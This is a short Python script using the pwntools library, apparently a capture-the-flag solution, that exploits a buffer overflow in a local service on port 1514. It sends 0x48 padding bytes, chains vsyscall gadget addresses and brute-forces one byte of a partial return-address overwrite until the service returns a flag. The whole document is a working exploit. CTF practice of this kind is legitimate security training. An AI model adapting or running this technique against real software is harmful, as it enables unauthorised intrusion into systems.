#!/usr/bin/python 
from pwn import *

check = False
i = 0
while check == False:
    r = remote("127.0.0.1", 1514)
    payload = "A"*0x48
    gadget = 0xffffffffff600800         # mov rax, 0x135; syscall; ret
    payload += p64(gadget)*2
    payload += "\x8b"
    payload += chr(i)
    r.sendlineafter("Length of password: ", str(len(payload)))
    r.sendline(payload)
    try:
        reply = r.recv()
        if "flag" in reply:
            print (i)
            print (reply)
            break
    except:
        i += 1
